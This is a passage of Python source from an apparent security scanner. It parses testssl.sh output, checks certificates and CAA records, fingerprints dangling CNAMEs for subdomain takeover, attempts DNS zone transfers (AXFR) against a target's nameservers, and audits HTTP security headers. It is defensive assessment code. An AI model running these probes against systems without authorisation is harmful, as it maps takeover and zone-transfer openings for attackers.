    testssl = _find_tool("testssl.sh") or _find_tool("testssl")
    if testssl:
        out_f      = out.output_path(phase, f"testssl_{hostname}_{port}")
        _ts_json_f = out_f.parent / f"testssl_{hostname}_{port}_findings.json"
        cmd        = [testssl, "--color", "0", "--warnings", "off", "--quiet",
                      "--severity", "LOW", "--jsonfile", str(_ts_json_f), target["url"]]
        vc.log(f"[tls] Running testssl.sh on {host_port}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=300)
            _deregister_proc(proc)
            out_f.write_text(stdout, encoding="utf-8")
            out.log_command("testssl.sh", cmd, out_f)
            # Filter out (OK) lines, noise lines, and embedded HTTP content
            # that can cause false-positive pattern matches.
            _TESTSSL_NOISE = re.compile(
                r'Testing robust forward secrecy'
                r'|User-agent:'
                r'|Disallow:'
                r'|not offered'    # cipher/protocol absent → never a finding
                r'|make sure you don.t use this certificate',  # DROWN advisory continuation line
                re.I,
            )
            _ok_filtered = "\n".join(
                ln for ln in stdout.splitlines()
                if "(OK)" not in ln and not _TESTSSL_NOISE.search(ln)
            )
            for ftitle, (pat, risk, cve, _affected) in _TLS_VULN_PATTERNS.items():
                if pat.search(_ok_filtered):
                    _emit_title = "Weak Cipher Identified" if _affected else ftitle
                    out.add_finding(
                        title=_emit_title, url=target["url"], port=port,
                        risk=risk, description=f"TLS issue: {_emit_title}",
                        cves=cve, sources="testssl.sh", service="https",
                        output_file=str(out_f),
                        affected=_affected or "",
                        owasp="A02", nist="SC-8",
                        remediation="Disable weak protocols. Enable TLS 1.2/1.3 only.",
                    )
            # Detect missing security headers reported by testssl.
            # Checked against the full _SECURITY_HEADERS list; risk and format
            # aligned with shcheck findings so duplicates merge rather than stack.
            _HSTS_HDR = "Strict-Transport-Security"
            for _hdr_name, _hdr_risk, _, _hdr_desc, _hdr_nist, _hdr_remed in _SECURITY_HEADERS:
                if _hdr_name == _HSTS_HDR and not target["is_https"]:
                    continue
                if re.search(rf'{re.escape(_hdr_name)}\s+not offered', stdout, re.I):
                    out.add_finding(
                        title=f"Missing Security Header: {_hdr_name}",
                        url=target["url"], port=port,
                        risk=_hdr_risk,
                        description=f"The HTTP security header '{_hdr_name}' is absent.",
                        output=f"Missing: {_hdr_name}",
                        affected=_url_rel_path(target["url"], target["url"]),
                        sources="testssl.sh", service="https",
                        output_file=str(out_f),
                        owasp="A05:2025 Security Misconfiguration", nist=_hdr_nist,
                        remediation=_hdr_remed,
                    )
            # ── Certificate text extraction from testssl output ──────────────
            _ts_cert_subject = None
            _ts_cert_issuer  = None
            _ts_cert_expiry  = None
            _ts_cert_san: list = []
            _ts_grade        = None
            for _tsln in stdout.splitlines():
                _tsln_s = _tsln.strip()
                if not _ts_cert_subject:
                    _m = _RE_TS_SUBJECT.search(_tsln_s)
                    if _m:
                        _ts_cert_subject = _m.group(1).strip()
                if not _ts_cert_issuer:
                    _m = _RE_TS_ISSUER.search(_tsln_s)
                    if _m:
                        _ts_cert_issuer = _m.group(1).strip()
                if not _ts_cert_expiry:
                    _m = _RE_TS_EXPIRY.search(_tsln_s)
                    if _m:
                        _ts_cert_expiry = _m.group(1).strip()
                if not _ts_cert_san:
                    _m = _RE_TS_SAN.search(_tsln_s)
                    if _m:
                        _ts_cert_san = [s.strip() for s in _m.group(1).split(",") if s.strip()]
                if not _ts_grade:
                    _m = _RE_TS_GRADE.search(_tsln_s)
                    if _m:
                        _ts_grade = _m.group(1)
            if _ts_grade:
                out.add_finding(
                    title=f"SSL/TLS Grade: {_ts_grade}",
                    url=target["url"], port=port, risk="INFO",
                    description=f"testssl.sh assigned overall grade {_ts_grade} to {host_port}.",
                    output=f"Grade: {_ts_grade}",
                    sources="testssl.sh", service="https",
                    output_file=str(out_f),
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="",
                )
            # ── JSON-based structured finding extraction ─────────────────────
            # Preferred over text-pattern matching for structured cert/vuln data.
            if _ts_json_f.exists():
                try:
                    _ts_raw = json.loads(_ts_json_f.read_text(encoding="utf-8", errors="replace"))
                    if isinstance(_ts_raw, list):
                        _ts_findings = _ts_raw
                    elif isinstance(_ts_raw, dict):
                        _ts_findings = _ts_raw.get("findings", [])
                        if not _ts_findings:
                            _sr = _ts_raw.get("scanResult", [])
                            _ts_findings = _sr[0].get("Finding", []) if _sr else []
                    else:
                        _ts_findings = []
                except Exception:
                    _ts_findings = []
                for _tsf in _ts_findings:
                    try:
                        _tsf_id          = _tsf.get("id", "")
                        _tsf_sev         = (_tsf.get("severity") or "INFO").upper()
                        _tsf_risk        = _TESTSSL_RISK_MAP.get(_tsf_sev, "INFO")
                        _tsf_finding     = _tsf.get("finding") or ""
                        _tsf_finding_lo  = _tsf_finding.lower()
                        _tsf_affected    = ""
                        _tsf_cve_inline  = ",".join(re.findall(r'CVE-\d{4}-\d+', _tsf_finding))
                        # Deprecated protocol IDs
                        if _tsf_id in _TESTSSL_PROTO_IDS:
                            if "not offered" in _tsf_finding_lo:
                                continue
                            _tsf_proto = _TESTSSL_PROTO_IDS[_tsf_id]
                            _tsf_title = f"Deprecated Protocol Enabled: {_tsf_proto}"
                            _tsf_risk  = ("CRITICAL" if "SSLv2" in _tsf_proto else
                                          "HIGH"     if "SSLv3" in _tsf_proto else "MEDIUM")
                            _tsf_cve   = _TESTSSL_CVES_JSON.get(_tsf_id, "")
                        else:
                            _tsf_cve = _TESTSSL_CVES_JSON.get(_tsf_id, "")
                            if _tsf_cve_inline:
                                _all = {c for c in (_tsf_cve + "," + _tsf_cve_inline).split(",") if c.strip()}
                                _tsf_cve = ",".join(sorted(_all))
                            if _tsf_id in _TS_SKIP_IDS or _tsf_id.startswith("cipher-"):
                                continue
                            elif "self-signed" in _tsf_finding_lo or "self signed" in _tsf_finding_lo:
                                _tsf_title = "SSL/TLS Certificate: Self-Signed"
                                _tsf_risk  = "MEDIUM"
                            elif "chain incomplete" in _tsf_finding_lo:
                                _tsf_title = "SSL/TLS Certificate: Chain Incomplete"
                                _tsf_risk  = "LOW"
                            elif "potentially vulnerable" in _tsf_finding_lo:
                                _tsf_title = f"SSL/TLS Vulnerability (Potential): {_tsf_id}"
                                _tsf_risk  = "INFO"
                            elif _tsf_id.startswith("cipher_order"):
                                if "not" in _tsf_finding_lo:
                                    _tsf_title = "SSL/TLS Cipher: No Cipher Order Configured"
                                    _tsf_risk  = "LOW"
                                else:
                                    continue
                            elif _tsf_id.lower() == "cert_extlifespan":
                                _tsf_title = "SSL/TLS Certificate: Long Duration"
                                _tsf_risk  = "MEDIUM"
                            elif _tsf_id == "cert_subjectAltName":
                                _tsf_title = "SSL/TLS Certificate: Missing SAN"
                                _tsf_risk  = "LOW"
                            elif _tsf_id.startswith("hsts"):
                                if ("offered" in _tsf_finding_lo
                                        and "not offered" not in _tsf_finding_lo):
                                    continue
                                _tsf_title    = "Missing Security Headers"
                                _tsf_affected = "Strict-Transport-Security"
                                _tsf_risk     = "LOW"
                            elif _tsf_id in ("cert_notAfter", "cert_expirationStatus",
                                             "expiration"):
                                if any(kw in _tsf_finding_lo
                                       for kw in ("expired", "already past", "has expired")):
                                    _tsf_title = "SSL/TLS Certificate: Expired"
                                    _tsf_risk  = "HIGH"
                                else:
                                    continue
                            elif _tsf_id == "cert_keySize":
                                _tsf_title = "SSL/TLS Certificate: Weak Encryption Method"
                            elif _tsf_id == "cert_serialNumberLen":
                                _tsf_title = "SSL/TLS Certificate: Serial Number Entropy"
                            elif _tsf_id == "cipherlist_OBSOLETED":
                                _tsf_title = "SSL/TLS Ciphers: Obsolete Ciphers"
                            elif _tsf_id == "DNS_CAArecord":
                                _tsf_title = "SSL/TLS DNS: Missing CAA Record"
                                _tsf_risk  = "LOW"
                            elif _tsf_id == "TLS_session_ticket":
                                _tsf_title = "SSL/TLS Session: Long Duration"
                            elif _tsf_id in ("LUCKY13", "SWEET32"):
                                if "not vulnerable" in _tsf_finding_lo:
                                    continue
                                _tsf_title = f"SSL/TLS Vulnerability: {_tsf_id}"
                                _tsf_risk  = "MEDIUM"
                            else:
                                if _tsf_risk == "INFO":
                                    continue
                                _tsf_title = f"SSL/TLS Vulnerability: {_tsf_id}"
                        out.add_finding(
                            title=_tsf_title,
                            url=target["url"], port=port, risk=_tsf_risk,
                            description=_tsf_finding,
                            affected=_tsf_affected,
                            cves=_tsf_cve,
                            sources="testssl.sh", service="https",
                            output_file=str(out_f),
                            owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                            remediation="Remediate the identified TLS misconfiguration.",
                        )
                    except Exception:
                        continue
            # SAN coverage check — does the cert actually cover this hostname?
            if _ts_cert_san:
                _san_match = any(
                    hostname == s.strip().lstrip("*.") or
                    hostname.endswith("." + s.strip().lstrip("*."))
                    for s in _ts_cert_san
                )
                if not _san_match:
                    out.add_finding(
                        title="SSL/TLS Certificate: Hostname Mismatch",
                        url=target["url"], port=port, risk="HIGH",
                        description=(
                            f"The TLS certificate's Subject Alternative Names do not cover "
                            f"{hostname}. Clients will display a certificate mismatch warning, "
                            "enabling trivial MITM attacks. CWE-297."
                        ),
                        output=f"Hostname: {hostname}\nSANs: {', '.join(_ts_cert_san[:10])}",
                        sources="testssl.sh", service="https",
                        output_file=str(out_f),
                        owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                        remediation=(
                            f"Reissue the certificate to include {hostname} "
                            "in the Subject Alternative Name extension."
                        ),
                    )
        except Exception as e:
            out.log_error("testssl.sh", cmd, str(e))
    else:
        vc.log("[tls] testssl.sh not found — basic socket TLS check", "WARNING")
        import ssl as _ssl
        try:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            with ctx.wrap_socket(
                socket.create_connection((hostname, port), timeout=10),
                server_hostname=hostname
            ) as s:
                proto = s.version()
            # Informational: record negotiated TLS version
            if proto:
                out.add_finding(
                    title="TLS Version Identified",
                    url=target["url"], port=port, risk="INFO",
                    description=f"Server negotiated {proto}.",
                    output=f"Negotiated protocol: {proto}",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="",
                )
            if proto in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
                out.add_finding(
                    title=f"{proto} Enabled",
                    url=target["url"], port=port,
                    risk="MEDIUM" if "1.1" in (proto or "") else "HIGH",
                    description=f"Server negotiated {proto} which is considered weak.",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Configure TLS 1.2/1.3 only.",
                )
        except Exception:
            pass
        # Certificate trust check — detects self-signed and expired certs
        # even when sslscan/testssl are absent.
        try:
            ctx_v = _ssl.create_default_context()
            with ctx_v.wrap_socket(
                socket.create_connection((hostname, port), timeout=10),
                server_hostname=hostname,
            ) as _sv:
                pass  # verified OK — no cert finding needed
        except _ssl.SSLCertVerificationError as _e:
            _em = str(_e).lower()
            if "self signed" in _em or "unable to get local issuer" in _em:
                out.add_finding(
                    title="SSL/TLS Certificate: Self-Signed",
                    url=target["url"], port=port, risk="MEDIUM",
                    description="The server presented a self-signed TLS certificate that is not anchored to a publicly trusted CA, preventing clients from verifying the server's identity and enabling trivial MITM attacks.",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Replace self-signed certificates with certificates issued by a trusted CA; use ACME/Let's Encrypt for cost-free automation.",
                )
            elif "expired" in _em or "has expired" in _em:
                out.add_finding(
                    title="SSL/TLS Certificate: Expired",
                    url=target["url"], port=port, risk="HIGH",
                    description="The server's TLS certificate has passed its expiry date, causing browser trust errors and indicating a breakdown in certificate lifecycle management.",
                    sources="fracture-tls-socket", service="https",
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Renew the certificate immediately and implement automated renewal (e.g., ACME/Let's Encrypt) to prevent future expiry.",
                )
        except Exception:
            pass

    # ── CAA DNS record check ──────────────────────────────────────────────────
    # CAA restricts which CAs can issue certs for the domain.
    # Missing CAA = any CA can issue, enabling mis-issuance attacks.
    _dig_bin = shutil.which("dig")
    if _dig_bin:
        try:
            _caa_proc = subprocess.run(
                [_dig_bin, "+short", "CAA", hostname],
                capture_output=True, text=True, timeout=10,
            )
            if _caa_proc.returncode == 0 and not _caa_proc.stdout.strip():
                _caa_out = out.output_path(phase, f"dig_caa_{hostname}")
                _caa_out.write_text(
                    f"$ dig +short CAA {hostname}\n{_caa_proc.stdout or '(no output — no CAA records found)'}",
                    encoding="utf-8",
                )
                out.add_finding(
                    title="SSL/TLS DNS: Missing CAA Record",
                    url=target["url"], port=port, risk="LOW",
                    description=(
                        f"No CAA (Certification Authority Authorization) DNS record "
                        f"exists for {hostname}. Without CAA, any certificate authority "
                        "can issue certificates for this domain, increasing mis-issuance risk."
                    ),
                    output=f"dig +short CAA {hostname} → (no records)",
                    sources="fracture-tls-dns", service="https",
                    output_file=str(_caa_out),
                    owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                    remediation=(
                        f'Add a CAA record: {hostname} CAA 0 issue "letsencrypt.org" '
                        "(replace with your preferred CA)."
                    ),
                )
        except Exception:
            pass

    try:
        _write_target_profile(out, tls_enabled=True, **_tls_profile_info)
    except Exception:
        pass
    vc.status(phase, "TLS Analysis", "complete", "Done", 4, 4)
    vc.log("[tls] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 1b: Subdomain Takeover
# ─────────────────────────────────────────────

# Known dangling CNAME fingerprints (service → response pattern)
_TAKEOVER_FINGERPRINTS = [
    ("GitHub Pages",       re.compile(r"there isn't a github pages site here|"
                                       r"for root urls .* we recommend", re.I)),
    ("Heroku",             re.compile(r"no such app|heroku.*application error|"
                                       r"there's nothing here, yet", re.I)),
    ("Fastly",             re.compile(r"fastly error.*unknown domain", re.I)),
    ("Pantheon",           re.compile(r"the gods are wise.*there is no such site|"
                                       r"404 error unknown site", re.I)),
    ("Shopify",            re.compile(r"sorry, this shop is currently unavailable|"
                                       r"only a shop owner can do that", re.I)),
    ("Azure / Microsoft",  re.compile(r"this azure web app is unavailable|"
                                       r"domain.*not yet registered|"
                                       r"windows azure error|azure.*not configured", re.I)),
    ("AWS S3",             re.compile(r"nosuchbucket|the specified bucket does not exist|"
                                       r"bucket you are attempting to access must be addressed", re.I)),
    ("Tumblr",             re.compile(r"there's nothing here|"
                                       r"whatever you were looking for doesn't currently exist", re.I)),
    ("Zendesk",            re.compile(r"help center closed|"
                                       r"this help center no longer exists", re.I)),
    ("Cargo",              re.compile(r"if you're moving your domain away from cargo|"
                                       r"cargocollective.com", re.I)),
    ("WP Engine",          re.compile(r"the site you were looking for.*couldn't be found", re.I)),
    ("Unbounce",           re.compile(r"the requested url was not found on this server.*unbounce", re.I)),
    ("Webflow",            re.compile(r"page not found.*webflow|"
                                       r"this page is not available", re.I)),
    ("Surge.sh",           re.compile(r"project not found.*surge", re.I)),
    ("BigCartel",          re.compile(r"bohoo.*page not found.*bigcartel", re.I)),
]


def _phase_subdomain_takeover(target: dict, cfg: dict, pm: ProgressManager,
                               out: OutputManager, sess: requests.Session) -> None:
    """Phase 1b: Subdomain takeover — dangling CNAME and AXFR detection."""
    phase   = "subdomain_takeover"
    url     = target["url"]
    host    = target["hostname"]
    timeout = cfg.get("timeout", 10)

    vc.status(phase, "Subdomain Takeover", "running", "CNAME dangling check", 0, 2)

    # 1. Check if host has a CNAME pointing to an unclaimed service
    import dns.resolver  # type: ignore[import]  # dnspython
    cname_target = None
    try:
        answers = dns.resolver.resolve(host, "CNAME")
        if answers:
            cname_target = str(answers[0].target).rstrip(".")
    except Exception:
        pass

    if cname_target:
        # Try to reach the CNAME target directly
        try:
            r = sess.get(f"https://{cname_target}", timeout=timeout,
                         headers={"Host": host}, allow_redirects=True)
            for service, pattern in _TAKEOVER_FINGERPRINTS:
                if pattern.search(r.text):
                    out.add_finding(
                        title=f"Subdomain Takeover — Dangling CNAME ({service})",
                        url=url, port=target["port"], risk="HIGH",
                        description=(
                            f"The hostname '{host}' has a CNAME record pointing to "
                            f"'{cname_target}' but the target service ({service}) "
                            f"shows an unclaimed/available page. An attacker may be "
                            f"able to register this resource and serve malicious content."
                        ),
                        output=(
                            f"CNAME: {host} → {cname_target}\n"
                            f"Service: {service}\n"
                            f"Response excerpt: {r.text[:500]}"
                        ),
                        sources="fracture-subdomain-takeover", service=target["scheme"],
                        affected=url,
                        owasp="A05:2025 Security Misconfiguration", nist="CM-8",
                        remediation=(
                            "Remove the dangling DNS CNAME record or claim the resource "
                            f"at {cname_target} immediately. Monitor all DNS CNAMEs "
                            "that point to third-party services."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[subdomain_takeover] Dangling CNAME ({service}): {host} → {cname_target}", "SUCCESS")
                    break
        except Exception:
            pass
    elif not cname_target:
        # No CNAME — check A/AAAA record resolves to a responsive host
        try:
            r = sess.get(url, timeout=timeout, allow_redirects=True)
            for service, pattern in _TAKEOVER_FINGERPRINTS:
                if pattern.search(r.text):
                    out.add_finding(
                        title=f"Subdomain Takeover Indicator ({service})",
                        url=url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The response from '{host}' matches a known takeover "
                            f"fingerprint for {service}. The DNS may have been "
                            f"recently updated but the service resource is unclaimed."
                        ),
                        output=f"Service: {service}\nResponse: {r.text[:500]}",
                        sources="fracture-subdomain-takeover", service=target["scheme"],
                        affected=url,
                        owasp="A05:2025 Security Misconfiguration", nist="CM-8",
                        remediation=(
                            "Verify DNS records for this host and claim the associated "
                            "service resource if applicable."
                        ),
                        http_code=r.status_code,
                    )
                    break
        except Exception:
            pass

    # 2. DNS zone transfer (AXFR) check
    vc.status(phase, "Subdomain Takeover", "running", "AXFR check", 1, 2)
    try:
        import dns.zone  # type: ignore[import]
        import dns.query  # type: ignore[import]
        # Get nameservers for the domain
        ns_answers = dns.resolver.resolve(host, "NS")
        for ns_rdata in ns_answers:
            ns_host = str(ns_rdata.target).rstrip(".")
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns_host, host, timeout=5))
                if zone:
                    # AXFR succeeded — huge finding
                    names = [str(n) for n in zone.nodes.keys()][:20]
                    out.add_finding(
                        title="DNS Zone Transfer Permitted (AXFR)",
                        url=url, port=target["port"], risk="HIGH",
                        description="The DNS server responds to unauthenticated AXFR zone transfer requests, exposing the complete DNS zone including internal hostnames, IP addresses, and mail infrastructure.",
                        output=(
                            f"Nameserver: {ns_host}\n"
                            f"Records ({len(names)} shown): {', '.join(names)}"
                        ),
                        sources="fracture-subdomain-takeover", service="dns",
                        affected=host,
                        owasp="A05:2025 Security Misconfiguration", nist="SC-5",
                        remediation="Restrict zone transfer permissions to authorised secondary name server IP addresses using ACLs in the DNS server configuration.",
                    )
                    vc.log(f"[subdomain_takeover] AXFR permitted: {ns_host} → {host}", "SUCCESS")
                    break
            except Exception:
                pass
    except Exception:
        pass

    vc.status(phase, "Subdomain Takeover", "complete", "Done", 2, 2)
    vc.log("[subdomain_takeover] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2: Headers
# ─────────────────────────────────────────────
_SECURITY_HEADERS = [
    ("Strict-Transport-Security", "MEDIUM",  "Missing HSTS Header",
     "Without HSTS, browsers may connect over plain HTTP enabling SSL-stripping downgrade attacks (RFC 6797). CWE-523, CWE-319.",
     "SC-8", "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
    ("Content-Security-Policy",   "MEDIUM", "Missing Content-Security-Policy Header",
     "Without CSP, the application is susceptible to XSS attacks.",
     "SI-10", "Implement a Content-Security-Policy to restrict resource loading."),
    ("X-Frame-Options",           "LOW",    "Missing X-Frame-Options Header (Clickjacking)",
     "Without X-Frame-Options, the page may be embedded in an iframe for clickjacking.",
     "SI-10", "Add: X-Frame-Options: DENY or SAMEORIGIN"),
    ("X-Content-Type-Options",    "LOW",    "Missing X-Content-Type-Options Header",
     "Without this header, browsers may MIME-sniff responses enabling XSS.",
     "SI-10", "Add: X-Content-Type-Options: nosniff"),
    ("Referrer-Policy",           "LOW",    "Missing Referrer-Policy Header",
     "Without Referrer-Policy, URL parameters may leak to third parties.",
     "SI-12", "Add: Referrer-Policy: strict-origin-when-cross-origin"),
    ("Cache-Control",             "LOW",    "Missing Cache-Control Header",
     "Without Cache-Control, sensitive responses may be stored by browser or proxy caches.",
     "SI-12", "Add: Cache-Control: no-store, no-cache to sensitive endpoint responses."),
]
_SEC_HDR_RISK  = {h: r for h, r, *_ in _SECURITY_HEADERS}

# Headers allowed by the shcheck parser — must match _SECURITY_HEADERS names exactly
_SHCHECK_ALLOWED_HEADERS = {
    "Strict-Transport-Security", "Content-Security-Policy",
    "X-Frame-Options", "X-Content-Type-Options",
    "Referrer-Policy", "Cache-Control",
}


def _platform_remed(base: str, server: str = "", powered_by: str = "") -> str:
    """Extend a base remediation string with platform-specific guidance."""
    _s = (server + " " + powered_by).lower()
    parts = [base]
    if "iis" in _s or "microsoft" in _s or "asp.net" in _s or "aspnet" in _s:
        parts.append(
            "Windows / IIS: Add via web.config <customHeaders> or URL Rewrite outbound rules. "
            "PowerShell: Set-WebConfigurationProperty -pspath 'IIS:\\\\' "
            "-filter system.webServer/httpProtocol/customHeaders -name . "
            "-value @{name='<Header>';value='<Value>'}"
        )
    elif "apache" in _s:
        parts.append(
            "Apache (Debian/Ubuntu): sudo a2enmod headers && "
            "echo 'Header always set <Header> \"<Value>\"' | "
            "sudo tee /etc/apache2/conf-available/security-headers.conf && "
            "sudo a2enconf security-headers && sudo systemctl reload apache2\n"
            "Apache (RHEL/CentOS): add to /etc/httpd/conf/httpd.conf or conf.d/*.conf: "
            "Header always set <Header> \"<Value>\""
        )
    elif "nginx" in _s:
        parts.append(
            "Nginx (Debian/Ubuntu): add to /etc/nginx/conf.d/security.conf: "
            "add_header <Header> '<Value>' always; then: sudo nginx -t && sudo systemctl reload nginx\n"
            "Nginx (RHEL/CentOS): add to /etc/nginx/nginx.conf server{} block: "
            "add_header <Header> '<Value>' always;"
        )
    elif "flask" in _s or "werkzeug" in _s or "gunicorn" in _s or "uvicorn" in _s:
        parts.append(
            "Flask/Python: @app.after_request\n"
            "def set_security_headers(response):\n"
            "    response.headers['<Header>'] = '<Value>'\n"
            "    return response"
        )
    elif "tomcat" in _s or "spring" in _s or "jetty" in _s:
        parts.append(
            "Tomcat: Add HttpHeaderSecurityFilter to web.xml. "
            "Spring Security: http.headers().addHeaderWriter("
            "new StaticHeadersWriter(\"<Header>\", \"<Value>\"));"
        )
    elif "express" in _s or "node" in _s:
        parts.append(
            "Express/Node.js: npm install helmet && app.use(helmet()); "
            "or: app.use((req,res,next)=>{ res.setHeader('<Header>','<Value>'); next(); });"
        )
    elif "caddy" in _s:
        parts.append(
            "Caddy: Add to Caddyfile: header <Header> \"<Value>\""
        )
    else:
        parts.append(
            "Apache: Header always set <Header> \"<Value>\" | "
            "Nginx: add_header <Header> '<Value>' always; | "
            "IIS: web.config <customHeaders> | "
            "Flask: @app.after_request | "
            "Express/Node: helmet or res.setHeader() | "
            "Tomcat: HttpHeaderSecurityFilter in web.xml"
        )
    return "\n".join(parts)


def _phase_headers(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session) -> None:
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Security Headers", "running", "Fetching headers", 0, 5)

    try:
        resp    = sess.get(url, timeout=timeout, allow_redirects=True)
        headers = resp.headers
    except Exception as e:
        vc.log(f"[headers] Could not fetch {url}: {e}", "ERROR")
        return

    out_f = out.output_path(phase, "headers_" + target["hostname"])
    out_f.write_text(
        "\n".join(f"{k}: {v}" for k, v in headers.items()), encoding="utf-8"
    )
    # Save the raw HTTP request/response pair as evidence for header findings;
    # encode as a single-entry JSON array so Crucible can render the URL dropdown
    _sh_ev = ""
    try:
        _sh_rq, _sh_rp = _save_http_evidence(
            out, phase, f"headers_req_{target['hostname']}", resp)
        _sh_ev = json.dumps([{"url": url, "req": str(_sh_rq), "resp": str(_sh_rp)}])
    except Exception:
        pass

    # Header Data Leakage — record server/technology disclosure headers
    _hdr_cmd = f"python3 -c \"import requests; r=requests.get('{url}'); print(dict(r.headers))\""
    server_hdr = headers.get("Server", "")
    if server_hdr:
        out.add_finding(
            title="Header Data Leakage: Server",
            url=url, port=target["port"], risk="LOW",
            description="The HTTP Server response header reveals the web server software name and version, reducing the attacker's reconnaissance effort needed to identify version-specific vulnerabilities.",
            output=f"Server: {server_hdr}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Remove or genericise the Server response header in the web server configuration (e.g., ServerTokens Prod in Apache; server_tokens off in nginx).",
            command=_hdr_cmd,
            http_code=resp.status_code,
        )
    powered_by = headers.get("X-Powered-By", "")
    if powered_by:
        out.add_finding(
            title="Header Data Leakage: X-Powered-By",
            url=url, port=target["port"], risk="LOW",
            description="The X-Powered-By response header discloses the application framework, language, or runtime version, reducing the attacker's effort needed to identify version-specific vulnerabilities.",
            output=f"X-Powered-By: {powered_by}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation='Remove or suppress the X-Powered-By header at the application framework or reverse-proxy level (e.g., app.disable("x-powered-by") in Express; Header unset X-Powered-By in Apache).',
            command=_hdr_cmd,
            http_code=resp.status_code,
        )
    aspnet_ver = headers.get("X-AspNet-Version", "") or headers.get("X-AspNetMvc-Version", "")
    if aspnet_ver:
        out.add_finding(
            title="Header Data Leakage: X-AspNet-Version",
            url=url, port=target["port"], risk="LOW",
            description="The X-AspNet-Version response header reveals the exact ASP.NET framework version, aiding an attacker in identifying applicable CVEs or version-specific attack techniques.",
            output=f"X-AspNet-Version: {aspnet_ver}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation='Disable the header by setting enableVersionHeader="false" in the httpRuntime element of web.config.',
            command=_hdr_cmd,
            http_code=resp.status_code,
        )
    via_hdr = headers.get("Via", "")
    if via_hdr:
        out.add_finding(
            title="Header Data Leakage: Via",
            url=url, port=target["port"], risk="LOW",
            description=f"The Via header discloses intermediate proxy or CDN infrastructure: '{via_hdr}'. This reveals internal routing topology and proxy software versions.",
            output=f"Via: {via_hdr}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation=_platform_remed(
                "Configure proxies and load balancers to strip or genericize the Via header before forwarding to clients.",
                server_hdr, powered_by,
            ),
            command=_hdr_cmd,
            http_code=resp.status_code,
        )

    vc.status(phase, "Security Headers", "running", "Security header check", 1, 5)

    is_https = target["is_https"]
    _base_sec_hdrs_present: set = set()
    _base_sec_hdrs_absent:  set = set()
    for hdr_name, risk, _unused_title, desc, nist_ctrl, remed in _SECURITY_HEADERS:
        if hdr_name == "Strict-Transport-Security" and not is_https:
            continue
        if hdr_name not in headers:
            _base_sec_hdrs_absent.add(hdr_name)
            out.add_finding(
                title=f"Missing Security Header: {hdr_name}",
                url=url, port=target["port"], risk=risk,
                description=desc, sources="fracture-headers",
                service=target["scheme"], output_file=_sh_ev,
                owasp="A05", nist=nist_ctrl,
                remediation=_platform_remed(remed, server_hdr, powered_by),
                output=f"Missing: {hdr_name}",
                affected=_url_rel_path(url, target["url"]),
                command=_hdr_cmd,
                http_code=resp.status_code,
            )
        else:
            _base_sec_hdrs_present.add(hdr_name)
    # Persist base-domain header state for per-endpoint deviation detection
    target["_base_sec_hdrs_present"] = _base_sec_hdrs_present
    target["_base_sec_hdrs_absent"]  = _base_sec_hdrs_absent
    try:
        _write_target_profile(out,
            server=server_hdr,
            powered_by=powered_by,
            security_headers={
                "present": sorted(_base_sec_hdrs_present),
                "missing": sorted(_base_sec_hdrs_absent),
            },
        )
    except Exception:
        pass
    _hdr_cookie_names: list = []

    # ── Permissive (misconfigured) security header checks ────────────────────
    _csp_val = headers.get("Content-Security-Policy", "")
    if _csp_val:
        _csp_l = _csp_val.lower()
        if "unsafe-inline" in _csp_l or "unsafe-eval" in _csp_l or (
            re.search(r"(?:default|script)-src[^;]*\*", _csp_l)
        ):
            out.add_finding(
                title="Permissive Security Header: Content-Security-Policy",
                url=url, port=target["port"], risk="LOW",
                description=(
                    "Content-Security-Policy is present but contains permissive directives "
                    f"(unsafe-inline, unsafe-eval, or wildcard sources) that undermine XSS protection: "
                    f"{_csp_val[:200]}"
                ),
                output=f"Content-Security-Policy: {_csp_val[:300]}",
                sources="fracture-headers", service=target["scheme"],
                output_file=str(out_f),
                owasp="A05:2025 Security Misconfiguration", nist="SI-10",
                remediation=_platform_remed(
                    "Remove 'unsafe-inline' and 'unsafe-eval' from CSP. "
                    "Use nonces or hashes for inline scripts. Replace wildcard (*) sources with explicit origins.",
                    server_hdr, powered_by,
                ),
                command=_hdr_cmd,
                http_code=resp.status_code,
            )

    _hsts_val = headers.get("Strict-Transport-Security", "")
    if _hsts_val and is_https:
        _ma_m = re.search(r'max-age\s*=\s*(\d+)', _hsts_val, re.I)
        _max_age = int(_ma_m.group(1)) if _ma_m else 0
        if _max_age < 31536000:
            out.add_finding(
                title="Permissive Security Header: Strict-Transport-Security",
                url=url, port=target["port"], risk="LOW",
                description=(
                    f"HSTS is present but max-age ({_max_age}s) is below the recommended "
                    "minimum of 31536000s (1 year), reducing protection against SSL-stripping."
                ),
                output=f"Strict-Transport-Security: {_hsts_val}",
                sources="fracture-headers", service=target["scheme"],
                output_file=str(out_f),
